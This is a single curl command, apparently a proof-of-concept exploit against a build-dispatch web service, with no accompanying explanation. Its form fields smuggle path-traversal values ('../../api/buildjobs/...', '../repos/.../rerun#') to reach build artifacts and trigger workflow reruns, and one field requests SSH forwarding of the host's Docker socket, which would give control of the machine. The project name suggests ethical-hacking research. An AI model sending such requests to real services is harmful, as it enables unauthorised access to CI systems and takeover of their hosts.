curl \
  -F "account=../../api/buildjobs/v4lkob3o6d91i7jj/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
  -F "project=libssh2-ethicalhacking" \
  -F "buildid=1337" \
  -F "base=main" \
  -F "hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
  -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/runs/10239836102/rerun#" \
  -F "ssh_host=127.0.0.1" \
  -F "ssh_port=2222" \
  -F "ssh_user=test" \
  -F "ssh_forward=127.0.0.1:22 127.0.0.1:22,127.0.0.1:2375 /var/run/docker.sock" \
  -F "ssh_hostkey=asdf" \
  -F "ssh_privkey=asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf" \
  -s 'https://dispatchoriginal.schoff.it'
